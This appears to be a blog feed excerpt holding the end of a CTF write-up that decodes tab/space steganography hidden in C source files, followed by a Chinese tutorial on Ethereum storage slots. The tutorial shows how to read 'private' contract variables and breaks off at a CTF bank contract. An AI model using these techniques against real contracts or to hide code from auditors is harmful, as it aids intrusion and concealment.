builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 249 300 hex: 0xf9 0x12c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后得到下一个压缩包的密码</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919073.png" alt></p><p>明显是brainfuck，但是解密得到乱码失败。猜测解压后应该得到字符串，但是字符串brainfuck加密后应该是++++++++[开头的，与密文不符，尝试在开头加上++++++++后解密成功</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919074.png" alt></p><p>elf文件打开</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test1'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">.&#x2F;test1hei~what you want??want a flag?sorry~there is no flagbut maybe your can find something useful!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后分析wav ，sileneye</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919075.png" alt></p><p>第三个文件夹打开</p><pre class="line-numbers language-none"><code class="language-none">1. 加入代码隐写的部分不能影响源代码的编译2. 不能很容易被公司审计专员看出来3. 不能直接明文交流<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>md写了不能明文交流，联想到tab和空格，但是几千个文件，挨个查看不现实，因此考虑写个脚本搜索，由于tab和空格编写的隐藏数据通常是连续的，同时要过滤到常见的双空格和双/t，因此考虑用 \t \t作为搜索字符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">get_file_list</span><span class="token punctuation">(</span>dir_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    _list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>dir_path<span class="token punctuation">)</span>    file_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> file_str <span class="token keyword">in</span> _list <span class="token punctuation">:</span>        new_dir_path <span class="token operator">=</span> dir_path<span class="token operator">+</span> <span class="token string">'\\'</span> <span class="token operator">+</span>file_str        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>new_dir_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            file_list<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>get_file_list<span class="token punctuation">(</span>new_dir_path<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span> <span class="token punctuation">:</span>            file_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_dir_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> file_listfile_list <span class="token operator">=</span> get_file_list<span class="token punctuation">(</span><span class="token string">r'c:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹'</span><span class="token punctuation">)</span><span class="token keyword">for</span> file_str <span class="token keyword">in</span>  file_list <span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_str<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">' \t \t'</span> <span class="token keyword">in</span> data <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>file_str<span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开后发现每个} 后面 有隐写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f_list <span class="token operator">=</span> <span class="token triple-quoted-string string">r'''c:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹\elf\rtld.cc:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹\malloc\arena.cc:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹\malloc\malloc.c'''</span>f_list <span class="token operator">=</span> f_list<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> f <span class="token keyword">in</span> f_list<span class="token punctuation">:</span>    <span class="token keyword">for</span> data <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token string">'&#125;'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            data <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token string">'\t'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                data1 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                data1 <span class="token operator">=</span> data1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> data1<span class="token punctuation">:</span>                    result <span class="token operator">+=</span> dataresult <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-none"><code class="language-nonespan aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转ascii</p><pre class="line-numbers language-none"><code class="language-none">SOS! please help me -&gt; rtld.cyour flag is in malloc.cGWCTF&#123;code_steganography_1s_funny!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethereum Storage</title>
      <link href="/2023/10/31/Ethereum-Storage/"/>
      <url>/2023/10/31/Ethereum-Storage/</url>
      
        <content type="html"><![CDATA[<h3 id="插槽"><a class="markdownIt-Anchor" href="#插槽"></a> 插槽</h3><p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为2^256超级数组中，数组每个元素为插槽，初始为0.</p><pre class="line-numbers language-none"><code class="language-none"># 插槽式数组存储----------------------------------|               0                |     # slot 0----------------------------------|               1                |     # slot 1----------------------------------|               2                |     # slot 2----------------------------------|              ...               |     # ...----------------------------------|              ...               |     # 每个插槽 32 字节----------------------------------|              ...               |     # ...----------------------------------|            2^256-1             |     # slot 2^256-1----------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当数据长度是已知时，其具体的存储位置将在编译时指定，而对于长度不确定的类型（如动态数组、映射），则会按一定规则计算存储位置。以下是对不同类型变量的储存模型的具体分析。</p><h4 id="值类型"><a class="markdownIt-Anchor" href="#值类型"></a> 值类型</h4><p>除映射和动态数组之外的所有类型，其数据长度都是已知的，如定长整型 (<code>int</code>/<code>uint</code>/…), 地址 (<code>address</code>), 定长浮点型 (<code>fixed</code>/<code>ufixed</code>/…), 定长字节数组 (<code>bytes1</code>-<code>bytes32</code>)，编译时将严格根据字段排序顺序，从位置 0 开始连续放置在存储中。如果可能的话，大小少于 32 字节的多个变量会被打包到一个插槽中，而当某项数据超过 32 字节，则需要占用多个连续插槽（<code>data.length / 32</code>）。规则如下：</p><ul><li>存储插槽的第一项会以低位对齐（即右对齐）的方式储存。</li><li>基本类型仅使用存储它们所需的字节。</li><li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽。</li><li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）。</li></ul><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> a<span class="token punctuation">;</span>      <span class="token comment">// 0（20）</span>    <span class="token builtin">uint8</span> b<span class="token punctuation">;</span>        <span class="token comment">// 0（1）</span>    <span class="token builtin">uint256</span> c<span class="token punctuation">;</span>      <span class="token comment">// 1（32）</span>    <span class="token builtin">bytes24</span> d<span class="token punctuation">;</span>      <span class="token comment">// 2（24）</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-----------------------------------------------------| unused (11) | b (1) |            a (20)           | &lt;- slot 0-----------------------------------------------------|                       c (32)                      | &lt;- slot 1-----------------------------------------------------| unused (8) |                d (24)                | &lt;- slot 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="映射"><a class="markdownIt-Anchor" href="#映射"></a> 映射</h4><p>对于形如 <code>mapping(address =&gt; uint) a;</code> 的映射类型变量，就无法简单仿照值类型按顺序储存了。对于映射，其会根据上节提到的规则占据位置 <code>p</code> 处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code> 是连接符。如果该值同时是一个非基本类型，则将 <code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> a<span class="token punctuation">;</span>      <span class="token comment">// 0</span>    <span class="token builtin">uint256</span> b<span class="token punctuation">;</span>                       <span class="token comment">// 1</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-soliditrty" data-language="soliditrty"><code class="language-soliditrty">-----------------------------------------------------|                    reserved (a)                   | &lt;- slot 0-----------------------------------------------------|                      b (32)                       | &lt;- slot 1-----------------------------------------------------|                        ...                        |   ......-----------------------------------------------------|                     a[addr] (32)                  | &lt;- slot &#96;keccak256(addr . 0)&#96;-----------------------------------------------------|                        ...                        |   ......-----------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即 p为所存储的插槽的位置。</p><h4 id="动态数组"><a class="markdownIt-Anchor" href="#动态数组"></a> 动态数组</h4><p>对于形如 <code>uint[] b;</code> 的动态数组，其同样会占用对应位置 <code>p</code> 处的插槽，用以储存数组的长度，而数组真正的起始点会位于 <code>keccak256(p)</code> 处</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> a<span class="token punctuation">;</span>      <span class="token comment">// 0</span>    <span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">;</span>       <span class="token comment">// 1</span>    <span class="token builtin">uint256</span> c<span class="token punctuation">;</span>      <span class="token comment">// 2</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-----------------------------------------------------|                      a (32)                       | &lt;- slot 0-----------------------------------------------------|                    b.length (32)                  | &lt;- slot 1-----------------------------------------------------|                      c (32)                       | &lt;- slot 2-----------------------------------------------------|                        ...                        |   ......-----------------------------------------------------|                      b[0] (32)                    | &lt;- slot &#96;keccak256(1)&#96;-----------------------------------------------------|                      b[1] (32)                    | &lt;- slot &#96;keccak256(1) + 1&#96;-----------------------------------------------------|                        ...                        |   ......-----------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="字节数组和字符串"><a class="markdownIt-Anchor" href="#字节数组和字符串"></a> 字节数组和字符串</h4><p>如果 <code>bytes</code> 和 <code>string</code> 的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。具体地说：如果数据长度小于等于 31 字节， 则它存储在高位字节（左对齐），最低位字节存储 <code>length * 2</code>。如果数据长度超出 31 字节，则在主插槽存储 <code>length * 2 + 1</code>， 数据照常存储在 <code>keccak256(slot)</code> 中。</p><h4 id="可见性"><a class="markdownIt-Anchor" href="#可见性"></a> 可见性</h4><p>由于以太坊上的所有信息都是公开的，所以即使一个变量被声明为 <code>private</code>，我们仍能读到变量的具体值。</p><p>利用 web3 提供的 <code>web3.eth.getStorageAt()</code> 方法，可以读取一个以太坊地址上指定位置的存储内容。所以只要计算出了一个变量对应的插槽位置，就可以通过调用该函数来获得该变量的具体值。</p><p>调用：</p><blockquote><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])web3.eth.getStorageAt(&quot;0x407d73d8a49eeb85d32cf465507dd71d507100c1&quot;, 0).then(console.log);&gt; &quot;0x033456732123ffff2342342dd12342434324234234fd234fd23fd4f23d4234&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-none"><code class="language-none">参数：address：String - 要读取的地址position：Number - 存储中的索引编号defaultBlock：Number|String - 可选，使用该参数覆盖 web3.eth.defaultBlock 属性值callback：Function - 可选的回调函数, 其第一个参数为错误对象，第二个参数为结果。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据储存位置分析"><a class="markdownIt-Anchor" href="#数据储存位置分析"></a> 数据储存位置分析</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x<span class="token punctuation">;</span> <span class="token comment">//  x的存储位置是storage</span>    <span class="token comment">// memoryArray的存储位置是 memory</span>    <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> memoryArray<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        x <span class="token operator">=</span> memoryArray<span class="token punctuation">;</span>    <span class="token comment">// 从 memory 复制到 storage</span>        <span class="token keyword">var</span> y <span class="token operator">=</span> x<span class="token punctuation">;</span>          <span class="token comment">// storage 引用传递局部变量y（y 是一个 storage 引用）</span>        y<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">// 返回第8个元素</span>        y<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>       <span class="token comment">// x同样会被修改</span>        <span class="token keyword">delete</span> x<span class="token punctuation">;</span>           <span class="token comment">// y同样会被修改</span>        <span class="token comment">// 错误， 不能将memory赋值给局部变量</span>        <span class="token comment">// y = memoryArray;  </span>        <span class="token comment">// 错误，不能通过引用销毁storage</span>        <span class="token comment">// delete y;        </span>        <span class="token function">g</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 引用传递， g可以改变x的内容</span>        <span class="token function">h</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 拷贝到memory， h无法改变x的内容</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">storage</span> storageArray<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> memoryArray<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><p>Balsn CTF 2019 的 Bank</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Bank</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> randomNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">SafeBox</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> done<span class="token punctuation">;</span>        <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">,</span> <span class="token builtin">bytes12</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> callback<span class="token punctuation">;</span>        <span class="token builtin">bytes12</span> hash<span class="token punctuation">;</span>        <span class="token builtin">uint</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    SafeBox<span class="token punctuation">[</span><span class="token punctuation">]</span> safeboxes<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">FailedAttempt</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> idx<span class="token punctuation">;</span>        <span class="token builtin">uint</span> time<span class="token punctuation">;</span>        <span class="token builtin">bytes12</span> triedPass<span class="token punctuation">;</span>        <span class="token builtin">address</span> origin<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> FailedAttempt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> failedLogs<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-----------------------------------------------------|     unused (12)     |          owner (20)         | &lt;- slot 0-----------------------------------------------------|                 randomNumber (32)                 | &lt;- slot 1-----------------------------------------------------|               safeboxes.length (32)               | &lt;- slot 2-----------------------------------------------------|       occupied by failedLogs but unused (32)      | &lt;- slot 3-----------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SafeBox与 FailedAttempt</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"># SafeBox <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span> unused <span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> hash <span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> callback <span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> done <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span>                     value <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                    <span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span># FailedAttempt<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span>                      idx <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                     <span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span>                     time <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                     <span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">|</span>          origin <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>         <span class="token operator">|</span>   triedPass <span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>   <span class="token operator">|</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">read_slot</span><span class="token punctuation">(</span><span class="token builtin">uint</span> k<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes32</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span> res <span class="token operator">:=</span> <span class="token function">sload</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">cal_addr</span><span class="token punctuation">(</span><span class="token builtin">uint</span> k<span class="token punctuation">,</span> <span class="token builtin">uint</span> p<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">cal_addr</span><span class="token punctuation">(</span><span class="token builtin">uint</span> p<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="source"><a class="markdownIt-Anchor" href="#source"></a> Source</h4><pre class="line-numbers language-solidity" 